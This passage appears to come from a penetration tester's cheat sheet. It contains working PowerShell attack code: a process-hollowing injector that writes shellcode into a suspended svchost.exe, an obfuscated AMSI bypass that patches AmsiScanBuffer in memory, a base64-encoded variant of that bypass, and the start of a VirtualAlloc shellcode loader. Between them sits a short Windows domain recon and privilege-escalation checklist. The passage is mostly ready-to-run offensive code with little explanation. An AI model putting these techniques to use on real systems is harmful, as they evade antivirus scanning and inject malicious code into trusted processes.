style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$unsafeMethodsType</span>.GetMethod(<span style="color:#333333;font-weight:400">&#39;GetModuleHandle&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$GetProcAddress</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$unsafeMethodsType</span>.GetMethod(<span style="color:#333333;font-weight:400">&#39;GetProcAddress&#39;</span>, [reflection.bindingflags]<span style="color:#333333;font-weight:400">&#39;Public,Static&#39;</span>, <span style="color:#0088ff;font-weight:400">$null</span>, [System.Reflection.CallingConventions]<span style="color:#ff9d00;font-weight:700">::</span>Any, @([System.IntPtr], [<span style="color:#7f0044;font-weight:400">string</span>]), <span style="color:#0088ff;font-weight:400">$null</span>);<br /><span style="color:#0088ff;font-weight:400">$CreateProcess</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$nativeMethodsType</span>.GetMethod(<span style="color:#3ad900;font-weight:400">&quot;CreateProcess&quot;</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Obtain the function addresses of the required hollowing functions</span><br /><span style="color:#0088ff;font-weight:400">$ResumeThreadAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Function</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;ResumeThread&quot;</span><br /><span style="color:#0088ff;font-weight:400">$ReadProcessMemoryAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Function</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;ReadProcessMemory&quot;</span><br /><span style="color:#0088ff;font-weight:400">$WriteProcessMemoryAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Function</span> <span style="color:#3ad900;font-weight:400">&quot;kernel32.dll&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;WriteProcessMemory&quot;</span><br /><span style="color:#0088ff;font-weight:400">$ZwQueryInformationProcessAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Function</span> <span style="color:#3ad900;font-weight:400">&quot;ntdll.dll&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;ZwQueryInformationProcess&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># Create the delegate types to call the previously obtain function addresses</span><br /><span style="color:#0088ff;font-weight:400">$ResumeThread</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Delegate</span> <span style="color:#0088ff;font-weight:400">$ResumeThreadAddr</span> @([IntPtr])<br /><span style="color:#0088ff;font-weight:400">$WriteProcessMemory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Delegate</span> <span style="color:#0088ff;font-weight:400">$WriteProcessMemoryAddr</span> @([IntPtr], [IntPtr], [<span style="color:#7f0044;font-weight:400">Byte</span>[]], [<span style="color:#7f0044;font-weight:400">Int32</span>], [IntPtr])<br /><span style="color:#0088ff;font-weight:400">$ReadProcessMemory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Delegate</span> <span style="color:#0088ff;font-weight:400">$ReadProcessMemoryAddr</span> @([IntPtr], [IntPtr], [<span style="color:#7f0044;font-weight:400">Byte</span>[]], [<span style="color:#7f0044;font-weight:400">Int</span>], [IntPtr]) ([<span style="color:#7f0044;font-weight:400">Bool</span>])<br /><span style="color:#0088ff;font-weight:400">$ZwQueryInformationProcess</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#00117f;font-weight:400">Get-Delegate</span> <span style="color:#0088ff;font-weight:400">$ZwQueryInformationProcessAddr</span> @([IntPtr], [<span style="color:#7f0044;font-weight:400">Int</span>], [<span style="color:#7f0044;font-weight:400">Byte</span>[]], [UInt32], [UInt32]) ([<span style="color:#7f0044;font-weight:400">Int</span>])<br /><br /><span style="color:#0088ff;font-weight:400"># Instantiate the required structures for CreateProcess and use them to launch svchost.exe</span><br /><span style="color:#0088ff;font-weight:400">$startupInformation</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$startupInformationType</span>.GetConstructors().Invoke(<span style="color:#0088ff;font-weight:400">$null</span>)<br /><span style="color:#0088ff;font-weight:400">$processInformation</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$processInformationType</span>.GetConstructors().Invoke(<span style="color:#0088ff;font-weight:400">$null</span>)<br /><br /><span style="color:#0088ff;font-weight:400">$cmd</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.StringBuilder]<span style="color:#ff9d00;font-weight:700">::</span>new(<span style="color:#3ad900;font-weight:400">&quot;C:\\Windows\\System32\\svchost.exe&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$CreateProcess</span>.Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @(<span style="color:#0088ff;font-weight:400">$null</span>, <span style="color:#0088ff;font-weight:400">$cmd</span>, <span style="color:#0088ff;font-weight:400">$null</span>, <span style="color:#0088ff;font-weight:400">$null</span>, <span style="color:#0088ff;font-weight:400">$false</span>, <span style="color:#333333;font-weight:400">0x4</span>, [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero, <span style="color:#0088ff;font-weight:400">$null</span>, <span style="color:#0088ff;font-weight:400">$startupInformation</span>, <span style="color:#0088ff;font-weight:400">$processInformation</span>))<br /><br /><span style="color:#0088ff;font-weight:400"># Obtain the required handles from the PROCESS_INFORMATION structure</span><br /><span style="color:#0088ff;font-weight:400">$hThread</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$processInformation</span>.hThread<br /><span style="color:#0088ff;font-weight:400">$hProcess</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$processInformation</span>.hProcess<br /><br /><span style="color:#0088ff;font-weight:400"># Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess</span><br /><span style="color:#0088ff;font-weight:400">$processBasicInformation</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.<span style="color:#7f0044;font-weight:400">Byte</span>[]]<span style="color:#ff9d00;font-weight:700">::</span>CreateInstance([System.<span style="color:#7f0044;font-weight:400">Byte</span>], <span style="color:#333333;font-weight:400">48</span>)<br /><span style="color:#0088ff;font-weight:400">$ZwQueryInformationProcess</span>.Invoke(<span style="color:#0088ff;font-weight:400">$hProcess</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$processBasicInformation</span>, <span style="color:#0088ff;font-weight:400">$processBasicInformation</span>.Length, <span style="color:#333333;font-weight:400">0</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION</span><br /><span style="color:#0088ff;font-weight:400"># structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image</span><br /><span style="color:#0088ff;font-weight:400"># addr is located at offset 0x10.</span><br /><span style="color:#0088ff;font-weight:400">$imageBaseAddrPEB</span> <span style="color:#ff9d00;font-weight:700">=</span> ([IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>new([BitConverter]<span style="color:#ff9d00;font-weight:700">::</span>ToUInt64(<span style="color:#0088ff;font-weight:400">$processBasicInformation</span>, <span style="color:#333333;font-weight:400">0x08</span>) <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">0x10</span>))<br /><br /><span style="color:#0088ff;font-weight:400"># Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200</span><br /><span style="color:#0088ff;font-weight:400"># bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB</span><br /><span style="color:#0088ff;font-weight:400"># already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.</span><br /><span style="color:#0088ff;font-weight:400">$memoryBuffer</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.<span style="color:#7f0044;font-weight:400">Byte</span>[]]<span style="color:#ff9d00;font-weight:700">::</span>CreateInstance([System.<span style="color:#7f0044;font-weight:400">Byte</span>], <span style="color:#333333;font-weight:400">0x200</span>)<br /><span style="color:#0088ff;font-weight:400">$ReadProcessMemory</span>.Invoke(<span style="color:#0088ff;font-weight:400">$hProcess</span>, <span style="color:#0088ff;font-weight:400">$imageBaseAddrPEB</span>, <span style="color:#0088ff;font-weight:400">$memoryBuffer</span>, <span style="color:#333333;font-weight:400">0x08</span>, <span style="color:#333333;font-weight:400">0</span>)<br /><br /><span style="color:#0088ff;font-weight:400">$imageBaseAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> [BitConverter]<span style="color:#ff9d00;font-weight:700">::</span>ToInt64(<span style="color:#0088ff;font-weight:400">$memoryBuffer</span>, <span style="color:#333333;font-weight:400">0</span>)<br /><span style="color:#0088ff;font-weight:400">$imageBaseAddrPointer</span> <span style="color:#ff9d00;font-weight:700">=</span> [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>new(<span style="color:#0088ff;font-weight:400">$imageBaseAddr</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.</span><br /><span style="color:#0088ff;font-weight:400"># The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative</span><br /><span style="color:#0088ff;font-weight:400"># entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally</span><br /><span style="color:#0088ff;font-weight:400"># found the non relative entry point address.</span><br /><span style="color:#0088ff;font-weight:400">$ReadProcessMemory</span>.Invoke(<span style="color:#0088ff;font-weight:400">$hProcess</span>, <span style="color:#0088ff;font-weight:400">$imageBaseAddrPointer</span>, <span style="color:#0088ff;font-weight:400">$memoryBuffer</span>, <span style="color:#0088ff;font-weight:400">$memoryBuffer</span>.Length, <span style="color:#333333;font-weight:400">0</span>)<br /><br /><span style="color:#0088ff;font-weight:400">$peOffset</span> <span style="color:#ff9d00;font-weight:700">=</span> [BitConverter]<span style="color:#ff9d00;font-weight:700">::</span>ToUInt32(<span style="color:#0088ff;font-weight:400">$memoryBuffer</span>, <span style="color:#333333;font-weight:400">0x3c</span>)                               <span style="color:#0088ff;font-weight:400"># PE header offset</span><br /><span style="color:#0088ff;font-weight:400">$entryPointAddrRelative</span> <span style="color:#ff9d00;font-weight:700">=</span> [BitConverter]<span style="color:#ff9d00;font-weight:700">::</span>ToUInt32(<span style="color:#0088ff;font-weight:400">$memoryBuffer</span>, <span style="color:#0088ff;font-weight:400">$peOffset</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#333333;font-weight:400">0x28</span>)     <span style="color:#0088ff;font-weight:400"># Relative entrypoint</span><br /><span style="color:#0088ff;font-weight:400">$entryPointAddr</span> <span style="color:#ff9d00;font-weight:700">=</span> [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>new(<span style="color:#0088ff;font-weight:400">$imageBaseAddr</span> <span style="color:#ff9d00;font-weight:700">+</span> <span style="color:#0088ff;font-weight:400">$entryPointAddrRelative</span>)               <span style="color:#0088ff;font-weight:400"># Absolute entrypoint</span><br /><br /><span style="color:#0088ff;font-weight:400"># Overwrite the entrypoint with shellcode and resume the thread.</span><br /><span style="color:#0088ff;font-weight:400">$WriteProcessMemory</span>.Invoke(<span style="color:#0088ff;font-weight:400">$hProcess</span>, <span style="color:#0088ff;font-weight:400">$entryPointAddr</span>, <span style="color:#0088ff;font-weight:400">$SHELLCODE</span>, <span style="color:#0088ff;font-weight:400">$SHELLCODE</span>.Length, [IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero)<br /><span style="color:#0088ff;font-weight:400">$ResumeThread</span>.Invoke(<span style="color:#0088ff;font-weight:400">$hThread</span>)<br /><br /><span style="color:#0088ff;font-weight:400"># Close powershell to remove it as the parent of svchost.exe</span><br /><span style="color:#ff9d00;font-weight:700">exit</span></pre></div></p><p></p><p><h2>Methodology windows recon</h2><ul><li>bloodhound </li><li>powerview<ul><li>domains</li><li>trusts</li><li>constrained delegation</li></ul></li><li>powerupsql <ul><li>especially with servers with names like sqlxx</li></ul></li><li>elevate privilges<ul><li>powerup.ps1</li><li>look for text files</li><li>look for files in inetpub </li><li>look for ssh keys on users directrories </li><li>look for files like scripts in directories likes Program Files </li><li>search installed software </li></ul></li></ul></p><p></p><p></p><p><h2>AMSI Bypass</h2><ul><li>Original RastaMouse AMSI bypass:</li><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">$LDUCS</span> <span style="color:#ff9d00;font-weight:700">=</span> @<span style="color:#3ad900;font-weight:400">&quot;<br />using System;<br />using System.Runtime.InteropServices;<br />public class LDUCS {<br />[DllImport(&quot;</span>kernel32<span style="color:#3ad900;font-weight:400">&quot;)]<br />public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br />[DllImport(&quot;</span>kernel32<span style="color:#3ad900;font-weight:400">&quot;)]<br />public static extern IntPtr LoadLibrary(string name);<br />[DllImport(&quot;</span>kernel32<span style="color:#3ad900;font-weight:400">&quot;)]<br />public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint<br />lpflOldProtect);<br />}<br />&quot;</span>@<br /><span style="color:#ff9d00;font-weight:700">Add-Type</span> <span style="color:#0088ff;font-weight:400">$LDUCS</span><br /><span style="color:#0088ff;font-weight:400">$TNHDXRW</span> <span style="color:#ff9d00;font-weight:700">=</span> [LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>LoadLibrary(<span style="color:#3ad900;font-weight:400">&quot;$([chAR](139-42)+[CHar](109)+[cHAr](47+68)+[CHaR]([byte]0x69)+[char](68-<br />22)+[cHAR]([ByTe]0x64)+[CHaR](108)+[char]([bytE]0x6C))&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$PEGLFK</span> <span style="color:#ff9d00;font-weight:700">=</span> [LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>GetProcAddress(<span style="color:#0088ff;font-weight:400">$TNHDXRW</span>,<br /><span style="color:#3ad900;font-weight:400">&quot;$(&#39;msScnBuffer&#39;.NoRMALizE([chaR]([ByTe]0x46)+[ChAR](42+69)+[chaR](15+99)+[chAr](109)+[CHaR](90-22)) -<br />replace [CHar]([bYTE]0x5C)+[ChAr]([BYte]0x70)+[char]([byTe]0x7B)+[chAR](77)+[CHAr](135-25)+[CHaR](206-81))&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$p</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span><br />[LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>VirtualProtect(<span style="color:#0088ff;font-weight:400">$PEGLFK</span>, [uint32]<span style="color:#333333;font-weight:400">5</span>, <span style="color:#333333;font-weight:400">0x40</span>, [ref]<span style="color:#0088ff;font-weight:400">$p</span>)<br /><span style="color:#0088ff;font-weight:400">$HFLY</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0xB8&quot;</span><br /><span style="color:#0088ff;font-weight:400">$MXWA</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0x57&quot;</span><br /><span style="color:#0088ff;font-weight:400">$ZGPQ</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0x00&quot;</span><br /><span style="color:#0088ff;font-weight:400">$DGFY</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0x07&quot;</span><br /><span style="color:#0088ff;font-weight:400">$WDWN</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0x80&quot;</span><br /><span style="color:#0088ff;font-weight:400">$EPLM</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;0xC3&quot;</span><br /><span style="color:#0088ff;font-weight:400">$VIZLX</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">Byte</span>[]] (<span style="color:#0088ff;font-weight:400">$HFLY</span>,<span style="color:#0088ff;font-weight:400">$MXWA</span>,<span style="color:#0088ff;font-weight:400">$ZGPQ</span>,<span style="color:#0088ff;font-weight:400">$DGFY</span>,<span style="color:#ff9d00;font-weight:700">+</span><span style="color:#0088ff;font-weight:400">$WDWN</span>,<span style="color:#ff9d00;font-weight:700">+</span><span style="color:#0088ff;font-weight:400">$EPLM</span>)<br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(<span style="color:#0088ff;font-weight:400">$VIZLX</span>, <span style="color:#333333;font-weight:400">0</span>, <span style="color:#0088ff;font-weight:400">$PEGLFK</span>, <span style="color:#333333;font-weight:400">6</span>)</pre></div><ul><li>obfuscate the AMSI bypass script was ISESteroids<ul><li></li></ul></li></ul><div class="codebox"><pre>${<span style="color:#333333;font-weight:400">11</span>} <span style="color:#ff9d00;font-weight:700">=</span><br />$([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQB<br />zAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIA<br />bABpAGMAIABjAGwAYQBzAHMAIABMAEQAVQBDAFMAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsA<br />DMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQ<br />B0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4<br />AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABw<br />AHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAd<br />AByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA<br />0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgB<br />vAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUA<br />aQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0A<br />CkAOwANAAoAfQA=&#39;</span>)))<br /><span style="color:#ff9d00;font-weight:700">Add-Type</span> ${<span style="color:#333333;font-weight:400">11</span>}<br />${<span style="color:#333333;font-weight:400">10</span>} <span style="color:#ff9d00;font-weight:700">=</span> [LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>LoadLibrary(<span style="color:#3ad900;font-weight:400">&quot;$([chAR](139-42)+[CHar](109)+[cHAr](47+68)+[CHaR]([byte]0x69)+[char](68-<br />22)+[cHAR]([ByTe]0x64)+[CHaR](108)+[char]([bytE]0x6C))&quot;</span>)<br />${<span style="color:#333333;font-weight:400">1</span>} <span style="color:#ff9d00;font-weight:700">=</span> [LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>GetProcAddress(${<span style="color:#333333;font-weight:400">10</span>},<br /><span style="color:#3ad900;font-weight:400">&quot;$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;wwBtAHMA7gBTAGMA4gBuAEIAdQBmAGYAZQByAA==<br />&#39;))).NoRMALizE([chaR]([ByTe]0x46)+[ChAR](42+69)+[chaR](15+99)+[chAr](109)+[CHaR](90-22)) -replace<br />[CHar]([bYTE]0x5C)+[ChAr]([BYte]0x70)+[char]([byTe]0x7B)+[chAR](77)+[CHAr](135-25)+[CHaR](206-81))&quot;</span>)<br />${<span style="color:#333333;font-weight:400">9</span>} <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span><br />[LDUCS]<span style="color:#ff9d00;font-weight:700">::</span>VirtualProtect(${<span style="color:#333333;font-weight:400">1</span>}, [uint32]<span style="color:#333333;font-weight:400">5</span>, <span style="color:#333333;font-weight:400">0x40</span>, [ref]${<span style="color:#333333;font-weight:400">9</span>})<br />${<span style="color:#333333;font-weight:400">8</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4AEIAOAA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">7</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4ADUANwA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">6</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4ADAAMAA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">5</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4ADAANwA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">4</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4ADgAMAA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">3</span>} <span style="color:#ff9d00;font-weight:700">=</span> $([Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>Unicode.GetString([Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#333333;font-weight:400">&#39;MAB4AEMAMwA=&#39;</span>)))<br />${<span style="color:#333333;font-weight:400">2</span>} <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">Byte</span>[]] (${<span style="color:#333333;font-weight:400">8</span>},${<span style="color:#333333;font-weight:400">7</span>},${<span style="color:#333333;font-weight:400">6</span>},${<span style="color:#333333;font-weight:400">5</span>},<span style="color:#ff9d00;font-weight:700">+</span>${<span style="color:#333333;font-weight:400">4</span>},<span style="color:#ff9d00;font-weight:700">+</span>${<span style="color:#333333;font-weight:400">3</span>})<br />[System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::Copy</span>(${<span style="color:#333333;font-weight:400">2</span>}, <span style="color:#333333;font-weight:400">0</span>, ${<span style="color:#333333;font-weight:400">1</span>}, <span style="color:#333333;font-weight:400">6</span>)<br />ction LookupFunc {<br /><span style="color:#ff9d00;font-weight:700">Param</span> (<span style="color:#0088ff;font-weight:400">$moduleName</span>, <span style="color:#0088ff;font-weight:400">$functionName</span>)<br /><span style="color:#0088ff;font-weight:400">$assem</span> <span style="color:#ff9d00;font-weight:700">=</span> ([AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.GetAssemblies() |<br /><span style="color:#ff9d00;font-weight:700">Where-Object</span> { <span style="color:#0088ff;font-weight:400">$_</span>.GlobalAssemblyCache <span style="color:#ff9d00;font-weight:700">-And</span> <span style="color:#0088ff;font-weight:400">$_</span>.Location.Split(<span style="color:#333333;font-weight:400">&#39;\\&#39;</span>)[<span style="color:#ff9d00;font-weight:700">-</span><span style="color:#333333;font-weight:400">1</span>].<br />Equals(<span style="color:#333333;font-weight:400">&#39;System.dll&#39;</span>) }).GetType(<span style="color:#333333;font-weight:400">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$tmp</span> <span style="color:#ff9d00;font-weight:700">=</span> @()<br /><span style="color:#0088ff;font-weight:400">$assem</span>.GetMethods() | <span style="color:#ff9d00;font-weight:700">ForEach-Object</span> { <span style="color:#ff9d00;font-weight:700">If</span> (<span style="color:#0088ff;font-weight:400">$_</span>.Name <span style="color:#ff9d00;font-weight:700">-eq</span> <span style="color:#3ad900;font-weight:400">&quot;GetProcAddress&quot;</span>) { <span style="color:#0088ff;font-weight:400">$tmp</span> <span style="color:#ff9d00;font-weight:700">+=</span> <span style="color:#0088ff;font-weight:400">$_</span> } }<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:400">$tmp</span>[<span style="color:#333333;font-weight:400">0</span>].Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @((<span style="color:#0088ff;font-weight:400">$assem</span>.GetMethod(<span style="color:#333333;font-weight:400">&#39;GetModuleHandle&#39;</span>)).Invoke(<span style="color:#0088ff;font-weight:400">$null</span>, @(<span style="color:#0088ff;font-weight:400">$moduleName</span>)),<br /><span style="color:#0088ff;font-weight:400">$functionName</span>))<br />}<br /><span style="color:#ff9d00;font-weight:700">function</span> getDelegateType {<br /><span style="color:#ff9d00;font-weight:700">Param</span> (<br />[<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span>, <span style="color:#ff9d00;font-weight:400">Mandatory</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$True</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>[]] <span style="color:#0088ff;font-weight:400">$func</span>,<br />[<span style="color:#ff9d00;font-weight:700">Parameter</span>(<span style="color:#ff9d00;font-weight:400">Position</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">1</span>)] [<span style="color:#ff9d00;font-weight:700">Type</span>] <span style="color:#0088ff;font-weight:400">$delType</span> <span style="color:#ff9d00;font-weight:700">=</span> [<span style="color:#7f0044;font-weight:400">Void</span>]<br />)<br /><span style="color:#0088ff;font-weight:400">$type</span> <span style="color:#ff9d00;font-weight:700">=</span> [AppDomain]<span style="color:#ff9d00;font-weight:700">::</span>CurrentDomain.DefineDynamicAssembly((<span style="color:#ff9d00;font-weight:700">New-Object</span><br />System.Reflection.AssemblyName(<span style="color:#333333;font-weight:400">&#39;ReflectedDelegate&#39;</span>)),<br />[System.Reflection.Emit.AssemblyBuilderAccess]<span style="color:#ff9d00;font-weight:700">::</span>Run).DefineDynamicModule(<span style="color:#333333;font-weight:400">&#39;InMemoryModule&#39;</span>,<br /><span style="color:#0088ff;font-weight:400">$false</span>).DefineType(<span style="color:#333333;font-weight:400">&#39;MyDelegateType&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;</span>,<br />[System.MulticastDelegate])<br /><span style="color:#0088ff;font-weight:400">$type</span>.DefineConstructor(<span style="color:#333333;font-weight:400">&#39;RTSpecialName, HideBySig, Public&#39;</span>,<br />[System.Reflection.CallingConventions]<span style="color:#ff9d00;font-weight:700">::</span>Standard, <span style="color:#0088ff;font-weight:400">$func</span>).SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br /><span style="color:#0088ff;font-weight:400">$type</span>.DefineMethod(<span style="color:#333333;font-weight:400">&#39;Invoke&#39;</span>, <span style="color:#333333;font-weight:400">&#39;Public, HideBySig, NewSlot, Virtual&#39;</span>, <span style="color:#0088ff;font-weight:400">$delType</span>,<br /><span style="color:#0088ff;font-weight:400">$func</span>).SetImplementationFlags(<span style="color:#333333;font-weight:400">&#39;Runtime, Managed&#39;</span>)<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#0088ff;font-weight:400">$type</span>.CreateType()<br />}<br /><span style="color:#0088ff;font-weight:400">$lpMem</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Runtime.InteropServices.Marshal]<span style="color:#ff9d00;font-weight:700">::</span>GetDelegateForFunctionPointer((LookupFunc kernel32.dll<br />VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]<span style="color:#ff9d00;font-weight:700">::</span>Zero,<br /><span style="color:#333333;font-weight:400">0x1000</span>, <span style="color:#333333;font-weight:400">0x3000</span>, <span style="color:#333333;font-weight:400">0x40</span>)<br /><span 